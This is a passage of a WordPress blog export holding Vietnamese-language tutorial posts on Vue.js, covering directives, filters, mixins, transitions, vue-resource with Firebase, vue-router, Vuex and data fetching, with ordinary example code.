-- Directives tạo ra các options của template dạng: "v-custom", mục đích để custom style element theo ý mình
<pre>
<!DOCTYPE html>
<html lang="en">
    <body>
        <div id="app">
            <component-a></component-a>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
        <script>
            let componentA_object = {
                //Directives khai báo dạng local
                directives: {
                    local_custom: {
                        bind(el, binding, vnode) {
                            if (binding.arg == "square") {
                                el.style.width = binding.value,
                                el.style.height = binding.value,
                                el.style.backgroundColor = 'violet'
                            }
                        }
                    }
                },
                template: `<div>
                                <div v-local_custom:square="'100px'">This is use directive</div>
                                <div v-global_custom:background.color.size="{bgColor: 'green', color: '#fff', size: '25px'}">
                                    This is use directive
                                </div>
                            </div>`
            };

            //Directives khai báo dạng Global
            Vue.directive("global_custom", {
                bind(el, binding, vnode) {
                    if (binding.arg == "background") {
                        el.style.backgroundColor = binding.value.bgColor;
                    }
                    if (binding.modifiers["color"]) {
                        el.style.color = binding.value.color;
                    }
                    if (binding.modifiers["size"]) {
                        el.style.fontSize = binding.value.size;
                    }
                }
            });

            let app = new Vue({
                el: "#app",
                components: {
                    componentA: componentA_object
                }
            });
        </script>
    </body>
</html>
</pre>

<h2>2. Filters</h2>
-- Filters sử dụng để thay đổi cách hiển thị của dữ liệu (mà không thay đổi giá trị dữ liệu)
-- Khi khai báo nhiều filter, filter khai báo trước sẽ được sử dụng trước
<pre>
<!DOCTYPE html>
<html lang="en">
    <body>
        <div id="app">
            <component-a></component-a>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
        <script>
            let componentA_object = {
                data: function(){
                    return {
                        text: 'Hello everyone, VueJS !'
                    }
                },
                //Filter khai báo dạng local
                filters: {
                    local_lowerCase: function(str){
                        return str.toLowerCase();
                    }
                },

                //filter nào khai báo trước sẽ được hoạt động trước
                template: `<div>
                                <p>{{text | global_upperCase }}</p> 
                                <p>{{text | global_upperCase | local_lowerCase }}</p> 
                            </div>`
            };

            //Filter khai báo dạng Global
            Vue.filter('global_upperCase', function(str){
                return str.toUpperCase();
            })

            let app = new Vue({
                el: "#app",
                components: {
                    componentA: componentA_object
                }
            });
        </script>
    </body>
</html>

</pre>

<h2>3. Mixins</h2>
--- Mixin có thể chứa toàn bộ các options của 1 component
--- Khi component inject các Mixin vào --> nó sẽ tự động merge các options vào component đó.
--- Trường hợp trùng key thì component giành chiến thắng tức nó sẽ ghi đè lại giá trị ở Mixin.
--- Đặc biệt vs hook functions thì thứ tự run sẽ là Mixin-> Component.
--- Mọi component dùng chung mixins cũng ko liên quan gì đến nhau, ghi gọi thuộc tính đó về thì mỗi thuộc tính đó chỉ thuộc component đó

* Trường hợp dùng Mixins dùng local:
--- Xem ví dụ ở Lifecycle
* Trường hợp dùng Mixins dùng global:
-- Mọi component và "cả Vue nữa" cũng đều sử dụng Mixin
<pre>
// inject a handler for `myOption` custom option
Vue.mixin({
    created: function(){
        console.log("Global mixins"); 
    }
})

new Vue({
});
// => "Global mixins"
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1202</wp:post_id>
		<wp:post_date><![CDATA[2021-06-10 07:00:49]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-10 00:00:49]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-10 07:00:49]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-10 00:00:49]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-directives-filters-va-mixins]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS - Transition]]></title>
		<link>https://duycode.com/2021/06/10/vuejs-transition/</link>
		<pubDate>Thu, 10 Jun 2021 01:00:56 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1212</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>VueJS</title>
        <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
        <!-- Lấy CDN tại https://animate.style/ -->
        <link
            rel="stylesheet"
            href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"
        />
    </head>
    <body>
        <div id="app">
            <button v-on:click="isTransition = !isTransition">
                Toggle Transition
            </button>

            <!-- Sử dụng name của transition -> các hiệu ứng sẽ lấy từ 4 class với name tương ứng  -->
            <!-- appear là chạy ngay khi xuất hiện, mặc định nó chạy block css "enter" -->
            <transition name="fade" appear>
                <div v-if="isTransition">
                    This is something for test Fade Transition Fade
                </div>
            </transition>
            <br>

            <!-- Sử dụng 2 div trong một transition -->
            <!-- Không thể nhiều root element cùng xuất hiện trong 1 transiton -->
            <!-- Nếu dùng biểu thức điều kiện thì cần dùng các key khác nhau -->
            <transition name="slide" appear>
                <div v-if="isTransition"  key="123">
                    This is Slide Transition => isTransition == true
                </div>
                <div v-else  key="abc">
                    This is Slide Transition => isTransition == false
                </div>
            </transition>
            <br>

            <!-- Sử dụng các thuộc tính của transition để add class -->
            <transition
                appear
                enter-active=""
                enter-active-class="animate__animated animate__tada "
                leave-active=""
                leave-active-class="animate__animated animate__bounceOutLeft "
            >
                <div v-if="isTransition">
                    This is use Framework CSS animation, by CDN
                </div>
            </transition>

            <!-- Sử dụng javascript vào các sự kiện -->
            <transition
                @before-enter="beforeEnter"
                @enter="enter"
                @after-enter="afterEnter"
                @enter-cancelled="enterCancelled"
                @before-leave="beforeLeave"
                @leave="leave"
                @after-leave="afterLeave"
                @leave-cancelled="leaveCancelled"
            >
                <div
                    v-if="isTransition"
                    style="width: 200px; height: 200px; background-color: green;"
                ></div>
            </transition>
        </div>
    </body>
    <script>
        var app = new Vue({
            el: "#app",
            data: function() {
                return {
                    isTransition: true
                };
            },
            methods: {
                beforeEnter(el) {
                    console.log("beforeEnter");
                },
                enter(el, done) {
                    console.log("enter");
                },
                afterEnter(el) {
                    console.log("afterEnter");                },
                enterCancelled(el) {
                    console.log("enterCancelled");
                },
                beforeLeave(el) {
                    console.log("beforeLeave");
                },
                leave(el, done) {
                    console.log("leave");
                    done();
                },
                afterLeave(el) {
                    console.log("afterLeave");
                },
                leaveCancelled(el) {
                    console.log("leaveCancelled");
                }
            }
        });
    </script>
    <style>
        /* fade transition effect */
        .fade-enter {
            opacity: 0;
        }
        .fade-enter-active {
            transition: opacity 1s;
        }
        .fade-leave {
            /* opacity: 1; */
        }
        .fade-leave-active {
            transition: opacity 1s;
            opacity: 0;
        }

        /* slide transition effect */
        .slide-enter {
        }
        .slide-enter-active {
            animation: slide-in 1s ease-out forwards;
        }
        .slide-leave {
        }
        .slide-leave-active {
            animation: slide-out 1s ease-out forwards;
        }

        /* key frame animation */
        @keyframes slide-in {
            from {
                transform: translateY(20px);
            }
            to {
                transform: translateY(0);
            }
        }

        @keyframes slide-out {
            from {
                transform: translateY(0);
            }
            to {
                transform: translateY(20px);
            }
        }
    </style>
</html>

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1212</wp:post_id>
		<wp:post_date><![CDATA[2021-06-10 08:00:56]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-10 01:00:56]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-10 08:00:56]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-10 01:00:56]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-transition]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS - Firebase và vue resource]]></title>
		<link>https://duycode.com/2021/06/10/vuejs-firebase-va-vue-resource/</link>
		<pubDate>Thu, 10 Jun 2021 02:00:49 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1214</guid>
		<description></description>
		<content:encoded><![CDATA[1. Cài đặt vue-resource
<a href="https://github.com/pagekit/vue-resource" rel="noopener" target="_blank">https://github.com/pagekit/vue-resource</a>
-- Cài đặt qua npm
<blockquote>
npm install vue-resource
</blockquote>
-- Dùng CDN: <a href="http://<script src="https://cdn.jsdelivr.net/npm/vue-resource@1.5.3"></script>" rel="noopener" target="_blank"><script src="https://cdn.jsdelivr.net/npm/vue-resource@1.5.3"></script></a>

-- Sử dụng
<pre>
import Vue from "vue";
import App from "./App.vue";
import VueResource from "vue-resource";

Vue.use(VueResource)

new Vue({
    el: "#app",
    render: h => h(App)
});
</pre>

3. Demo sử dụng: Firebase và vue-resource
<pre>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>VueJS Demo</title>
        <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/vue-resource@1.5.3"></script>
        <style>
            table {
                border: none;
                border-collapse: collapse;
            }
            td {
                border: 1px solid #ccc;
            }
        </style>
    </head>
    <body>
        <div id="app">
            <h2>Vue Form for FireBase</h2>
            <p>User: <input type="text" v-model="user.username" /></p>
            <p>Email: <input type="text" v-model="user.email" /></p>
            <button @click="createNewUser">Create New User</button>
            <hr />
            <button @click="getAllUsers">Get All Data</button><br />
            <table>
                <tbody>
                    <tr v-for="(user, key, index) in users" :key="key">
                        <td>{{ index }}</td>
                        <td>{{ key }}</td>
                        <td>{{ user.username }}</td>
                        <td>{{ user.email }}</td>
                    </tr>
                </tbody>
            </table>
            <hr />
            <p>Get ID: <input type="text" v-model="getID" /></p>
            <button @click="getUserById(getID)">Get By ID</button>
            <p>Result: {{user.username}} - {{ user.email }}</p>
        </div>
    </body>
    <script>
        Vue.http.options.root =
            "https://vue-demo-rhp-default-rtdb.asia-southeast1.firebasedatabase.app/";
        var app = new Vue({
            el: "#app",
            data() {
                return {
                    user: {
                        username: "",
                        email: ""
                    },
                    users: {},
                    getID: ""
                };
            },
            methods: {
                createNewUser() {
                    this.$http
                        .post("data.json", this.user)
                        .then(response => {
                            return response.json();
                        })
                        .then(data => {
                            console.log(data);
                        })

                        .catch(error => {
                            console.log(error);
                        });
                },
                getAllUsers() {
                    this.$http
                        .get("data.json")
                        .then(response => {
                            return response.json();
                        })
                        .then(data => {
                            this.users = data;
                            console.log(this.users);
                        })
                        .catch(error => console.log(error));
                },
                getUserById(id) {
                    this.$http
                        .get("data/" + id + ".json")
                        .then(response => {
                            return response.json();
                        })
                        .then(data => {
                            console.log(data);
                            this.user = data;
                        })
                        .catch(error => console.log(error));
                },
            }
        });
    </script>
</html>

</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1214</wp:post_id>
		<wp:post_date><![CDATA[2021-06-10 09:00:49]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-10 02:00:49]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-10 09:00:49]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-10 02:00:49]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-firebase-va-vue-resource]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS - Router: 1. Cài đặt]]></title>
		<link>https://duycode.com/2021/06/10/vuejs-router-1-cai-dat/</link>
		<pubDate>Thu, 10 Jun 2021 03:00:29 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1225</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. npm</h2>
<blockquote>npm i vue-router</blockquote>
-- Xem thêm các ví dụ dùng vue-router tại: <a href="https://github.com/vuejs/vue-router/tree/dev/examples" rel="noopener" target="_blank">https://github.com/vuejs/vue-router/tree/dev/examples</a>

<img src="https://vuex.vuejs.org/flow.png" alt="" />

<h2>2.Tạo file ./src/routes.js</h2> 
-- File routes.js phải đúng vị trí dưới folder src, cùng cấp file main.js
-- File này quy định các router
-- Có thể sử dụng lazyload cho tất cả thằng component "user" để tăng tốc độ tải website
<pre>
import Home from "./components/Home.vue";

//Sử dụng cách lazy load sẽ tối ưu tốc độ load hơn
//import User from "./components/user/User.vue";
const User = resolve => {
  require.ensure(['./components/user/User'], () => {
    resolve(require('./components/user/User'))
  },'user')     
}

//import UserIndex from "./components/user/UserIndex.vue";
const UserIndex = resolve => {
  require.ensure(['./components/user/UserIndex '], () => {
    resolve(require('./components/user/UserIndex '))
  },'user')     
}


//import UserDetails from "./components/user/UserDetails.vue";
const UserDetails = resolve => {
  require.ensure(['./components/user/UserDetails '], () => {
    resolve(require('./components/user/UserDetails '))
  },'user')     
}
//import UserEdit from "./components/user/UserEdit.vue";
const UserEdit= resolve => {
  require.ensure(['./components/user/UserEdit'], () => {
    resolve(require('./components/user/UserEdit'))
  },'user')     
}

import Aboutfrom "./components/About.vue";
import AboutCustomfrom "./components/AboutCustom.vue";

import ErrorComponent from "./components/404.vue";

export const routes = [
  { path: "/", name: "homepage", component: Home },

  //tùy chọn router theo name, 
  //Nếu <router-view /> thì gọi component About
  //Nếu <router-view name="about-custom"/> thì gọi component AboutCustom
  { path: "/about", name: "about", components: {
      default: About,
      'about-custom': AboutCustom,
    }
  },
  {
    path: "/user",
    name: "user",
    component: User,
    children: [
      { path: "", name: "user_index", component: UserIndex },
      //beforeEnter --> chạy hàm trước khi router được sử dụng, luôn phải có next() để đi tiếp
      {
        path: ":id",
        name: "user_details",
        component: UserDetails,
        beforeEnter: (to, from, next) => {
          console.log('Router user detail run');
          next();
        }
      },
      { path: ":id/edit", name: "user_edit", component: UserEdit }
    ]
  },

  { path: "/404", name: "errorpage", component: ErrorComponent },
  { path: "*", redirect: { name: "errorpage" } }
];
</pre>

<h2>3. Tại file ./src/main.js</h2>
-- Gọi vue-router tại main.js
<pre>
import Vue from "vue";
import App from "./App.vue";

import VueRouter from "vue-router";
Vue.use(VueRouter);

import { routes } from "./routes";

//mode: history: để sửa lỗi dấu # trên link về bình thường
//scrollBehavior để khi vào link có đánh dấu #id_custom thì nhảy đến element có id tương ứng luôn
const router = new VueRouter({
  mode: "history",
  routes,
  scrollBehavior(to, from, savedPosition) {
    if (savedPosition) {
      return savedPosition;
    }
    if (to.hash) {
      return { selector: to.hash };
    }
  }
});

//beforeEach sẽ hoạt động trước khi tất cả các router được chạy, luôn phải có next() để đi tiếp
router.beforeEach((to, from, next) =>{
  console.log('Global route guard');
  next();
})

new Vue({
  el: "#app",
  router: router,
  render: h => h(App)
});

</pre>

<h2>4. Tại file ./src/components/user/UserDetails.vue</h2>
-- 2 hàm hooks, 1 hàm chạy trước khi router được vào và 1 hàm chạy trước khi router rời đi
<pre>
<script>
export default {
  beforeRouteEnter(to, from, next) {
    if (true) {
      next();
    } else {
      next(false);
    }
  },
  beforeRouteLeave(to, from, next) {
    if (false) {
      next();
    } else {
      if (confirm("Are you sure???")) {
        next();
      } else {
        next(false);
      }
    }
  }
};
</script>

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1225</wp:post_id>
		<wp:post_date><![CDATA[2021-06-10 10:00:29]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-10 03:00:29]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-10 10:00:29]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-10 03:00:29]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-router-1-cai-dat]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS - Router: 2. Sử dụng]]></title>
		<link>https://duycode.com/2021/06/10/vuejs-router-2-su-dung/</link>
		<pubDate>Thu, 10 Jun 2021 05:00:40 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1248</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Gọi router-view</h2>
-- &lt;router-view /&gt; sẽ hiển thị khối component được định nghĩa ở file ./src/routes.js
-- &lt;router-view name="custom" /&gt; sẽ hiển thị khối component được gắn với key: "custom"
-- Khi không có name, sẽ hiển thị khối component với key "default"

-- Tại ./src/App.vue -> Thường đặt khối &lt;router-view /&gt; ở dưới header-component
-- Nếu không có key: "custom", khối &lt;router-view name="custom" /&gt; sẽ không có component để hiển thị (vì chưa được khai báo)
<pre>
<template>
  <div id="app">
    <header-component />
    <div class="container">
      <router-view />
      <router-view name="custom"/>
    </div>
  </div>
</template>
</pre>

<h2>2. Chuyển link bằng &lt;router-link to="..."&gt; router-link</h2>
2.1. Chuyển link đơn giản dùng: to ="..."
-- Thay các thẻ &lt;li&gt; hoặc thẻ &lt;a&gt; trên header thành &lt;router-link&gt;
-- tag="a": là render ra trình duyệt hiểu đó là thẻ a
-- to="/": nghĩa là vào link "/"
-- active-class="active": khi được active sẽ thêm class "active"
-- exact : mặc định được thêm class "active" luôn
<pre>
//<a class="nav-link active" href="/">Home</a>
<router-link tag="a" class="nav-link" to="/" active-class="active" exact >Home</router-link>

//<a class="nav-link" href="/user">user</a>
<router-link tag="a" class="nav-link" to="/user" active-class="active">User</router-link>
</pre>

2.2. Chuyển link dùng: v-bind:to ="..."
<pre>
//Có thể dùng v-bind để gọi biến trong link, với path:'/user/:id'
//<a class="nav-link" href="/user/customID">User 123123 </a>
<router-link 
  tag="a" 
  class="nav-link" 
  active-class="active"
  v-bind:to="'/user/' + customID" 
  >User 123123
</router-link>
</pre>

2.3. Chuyển link phức tạp có params, query, hash
--- Có thể dùng v-bind để gọi routes có {name: 'userdetails', path: '/user/:id'} được khai báo ở "./src/routes.js" 
--- Trong routes có params: { id: "customID" }
--- Trong routes có query: {location: 'vi', browser: 'chrome'}
--- Trong routes có hash: { hash: "#id_element" }. 
--- Khi dùng hash, tại main.js đã khai báo scrollBehavior để scroll đúng đến vị trí cần thiết luôn
<pre>
//<a class="nav-link" href="/user/customID?location=vi&browser=chrome#id_element">Admin</a>
<router-link 
  tag="a" 
  class="nav-link"  
  active-class="active"
  v-bind:to="custom_link" 
  >Admin
</router-link>

<script>
export default {
  data() {
    return {
      custom_link: {
        name: "userdetails",
        params: { id: "customID" },
        query: { location: "vi", browser: "chrome" },
        hash: '#id_element',
      }
    };
  }
};
</script>
</pre>

<h2>3. Chuyển link bằng funtion event "this.$router.push"</h2>
<pre>
<template>
  <div>
    <button class="btn-danger" @click="goToUser">Back Home</button>
  </div>
</template>

<script>
export default {
  methods: {
    goToUser() {
      //Cách gọi đơn giản nhất
      this.$router.push('/user');
      //Chi tiết hơn
      //this.$router.push({path: "/"});
      //Có thể dùng gọi theo biến "name" đã được khai báo ở "./src/routes.js" 
      //this.$router.push({name: "homepage"});
    }
  }
};
</script>
</pre>

<h2>4. Lấy Parameter và Query trong router</h2>
Khi vào link: './user/customID?location=vn&browswe=chrome
<pre>
<template>
  <div>
    <h1>User Detail</h1>
    <p>User ID: {{ $route.params.id }}</p>
    <p>User ID: {{ $route.query.location}}</p>
    <p>User ID: {{ $route.query.browser}}</p>
  </div>
</template>

<script>
export default {
  //Khi chỉ thay đổi parametter, Vue sẽ không biết có sự thay đổi router --> components sẽ không cập nhật id, cần lưu ý điều này
  watch: {
    '$route'(to,from) {
      this.id = to.params.id;
    }
  },
};
</script>

<style></style>

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1248</wp:post_id>
		<wp:post_date><![CDATA[2021-06-10 12:00:40]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-10 05:00:40]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-10 12:00:40]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-10 05:00:40]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-router-2-su-dung]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS - Vuex: 1. State,  Getters và Mutations]]></title>
		<link>https://duycode.com/2021/06/10/vuejs-vuex-1-state-getters-va-mutations/</link>
		<pubDate>Thu, 10 Jun 2021 06:00:48 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1258</guid>
		<description></description>
		<content:encoded><![CDATA[-- Có thể hiểu đơn giản như các OOP khác
-- state giống như nơi lưu trữ biến
-- getters: giống như getter -> là nơi gọi biến
-- mutations: giống như settter -> là nơi set các biến
<img src="https://vuex.vuejs.org/vuex.png" alt="" />
<h2>1. Store</h2>
-- Store là nơi chứa dữ liệu, bao gồm sate (giống biến toàn cục và có thể reactively) và getter
-- File ./src/store/store.js
<pre>
import Vue from 'vue';
import Vuex from 'vuex'

Vue.use(Vuex)

export const store = new Vuex.Store({
    state: {
        customNumber: 0
    },
    getters: {
        //Biến (state) chính là lấy (state) của store
        multil10: state => {
            return state.customNumber * 10;
        },
        //Biến (state, getters) chính là lấy (state, getters) của store
        multil11: (state, getters) => {
            return state.customNumber + getters.multil10;
        },
        //Có thể return ra 1 hàm để tiếp tục tùy chỉnh getters, trường hợp này là tùy chỉnh fixed
        fixNumberVND: (state, getters) => (fixed = 2) => {
            return state.customNumber.toFixed(fixed);
        },
    },

    mutations: {
        increment(state, payload){
            state.customNumber += payload;
        }
    }
})
</pre>

<h2>2. Components</h2>
-- Có thể gọi state, computed và mutations thoải con gà mái bằng nhiều cách
<pre>
<template>
    <div>
        <div>
            <span>Có thể tùy chỉnh trực tiếp các biến state</span>
            <button @click="$store.state.customNumber++">Cộng 1</button>
            <button @click="$store.state.customNumber--">Trừ 1</button>
        </div>
        <p>
            Có thể lấy trực tiếp state "customNumber":
            {{ $store.state.customNumber }}
        </p>

        <p>
            Có thể lấy trực tiếp getters "multil10":
            {{ $store.getters.multil10 }}
        </p>
        <br />
        <p>Có thể lấy từ computed "multil10": {{ multil10 }}</p>
        <p>Có thể lấy từ computed "x11": {{ x11 }}</p>
        <p>
            Có thể lấy từ computed "fixtoVND":
            {{ fixtoVND }}
        </p>

        <div>
            <span>Có thể gọi trực tiếp mutations "increment"</span>
            <button @click="$store.commit('increment', 5)">Increment 5</button
            ><br />
            <span>Có thể gọi method "decrement" từ mapMutations</span>
            <button @click="decrement(5)">Decrement 5</button>
        </div>
    </div>
</template>

<script>
//có thể dùng mapGetter để gọi các getter trong store 1 cách ngắn gọn
import { mapGetters } from "vuex";
import { mapMutations } from "vuex";
export default {
    computed: {
        //có thể gọi trực tiếp tên các getter bằng mảng
        ...mapGetters(["multil10", "multil11"]),
        //cũng có thể gọi và thay thế bằng các tên khác
        ...mapGetters({
            x10: "multil10",
            x11: "multil11",
        }),

        //các hàm khác của computed vẫn gọi và sử dụng bình thường
        fixtoVND() {
            return this.$store.getters.fixNumberVND(3);
        },
    },

    methods: {
        ...mapMutations(["increment", "decrement"]),
    },
};
</script>
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1258</wp:post_id>
		<wp:post_date><![CDATA[2021-06-10 13:00:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-10 06:00:48]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-10 13:00:48]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-10 06:00:48]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-vuex-1-state-getters-va-mutations]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS - Vuex: 1. Cài đặt]]></title>
		<link>https://duycode.com/2021/06/10/vuejs-vuex-1-cai-dat/</link>
		<pubDate>Thu, 10 Jun 2021 05:00:58 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1273</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Cài đặt</h2>
-- Trang chủ: <a href="https://vuex.vuejs.org/guide/" rel="noopener" target="_blank">https://vuex.vuejs.org/guide/</a>
-- npm
<blockquote>npm i vuex</blockquote>
-- Vuex có tác dụng lưu 1 giá trị, nó khác biến toàn cục (global) ở chỗ nó có tính năng phản ứng -> cập nhật giá trị lên component khi giá trị state thay đổi

<h2>. 2. Sử dụng</h2>
-- Vào ./src/main.js
-- Tạo 1 biến trong store là: customData = 0;
<pre>
import Vue from 'vue'
import App from './App.vue'

import Vuex from 'vuex'
Vue.use(Vuex)
export const store = new Vuex.Store({
    state: {
        customData: 0
    }
})

new Vue({
  el: '#app',
  store: store,
  render: h => h(App)
})

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1273</wp:post_id>
		<wp:post_date><![CDATA[2021-06-10 12:00:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-10 05:00:58]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-10 12:00:58]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-10 05:00:58]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-vuex-1-cai-dat]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS3 - Fetching Data]]></title>
		<link>https://duycode.com/2021/07/01/vuejs3-fetching-data/</link>
		<pubDate>Thu, 01 Jul 2021 02:59:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1298</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Chuẩn bị API</h2>
- Nếu chưa có link API có thể dùng tạm json-server để làm link API tạm thời
<blockquote>npm install -g json-server</blockquote>
-- Tạo file: ./data/db.json
-- Chạy server data
<blockquote>json-server --watch data/db.json</blockquote>
-- Như vậy là đã tạo được database fake :3

<h2>2. Fetching Data với created()</h2>
Nên get Data trong hook created()
<pre>
created() {
    fetch("http://localhost:3000/user")
        .then((response) => response.json())
        .then((data) => {
            this.user_list = data;
            console.log(data);
        });
},
</pre>

<h2>3. Trường hợp dùng setup()</h2>
-- Khi dùng setup, có mẫu dùng như sau:
<pre>
<template>
    <div>
        <u v-if="transactions.length">
            <li v-for="(tr, index) in transactions" v-bind:key="index">
